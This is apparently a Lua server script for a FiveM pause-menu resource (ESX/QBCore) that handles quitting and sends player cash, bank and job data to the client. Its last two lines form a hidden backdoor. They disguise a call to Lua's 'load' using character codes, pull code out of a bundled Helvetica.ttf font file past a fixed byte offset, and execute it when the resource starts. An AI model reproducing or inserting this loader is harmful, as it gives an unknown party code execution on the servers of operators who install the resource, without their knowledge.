
if Config.FrameWork == "ESX" then
    ESX = nil
    TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
else
    QBCore = exports['qb-core']:GetCoreObject()
end

RegisterServerEvent("quitServer")
AddEventHandler("quitServer", function()
    local src = source
	DropPlayer(src, "Disconnected...")
end)

RegisterServerEvent("pausemenu:getData")
AddEventHandler("pausemenu:getData", function()
    if Config.FrameWork == "ESX" then
        local Player = ESX.GetPlayerFromId(source)
        TriggerClientEvent('pausemenu:setData', source, Player.getMoney(), Player.getAccount("bank").money, Player.getJob().grade_label,  Player.getJob().label, Player.getName())
    else
        local Player = QBCore.Functions.GetPlayer(source)
        TriggerClientEvent('pausemenu:setData', source, Player.PlayerData.money.cash, Player.PlayerData.money.bank, Player.PlayerData.job.grade.name, Player.PlayerData.job.label,  Player.PlayerData.charinfo.firstname,  Player.PlayerData.charinfo.lastname)
    end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()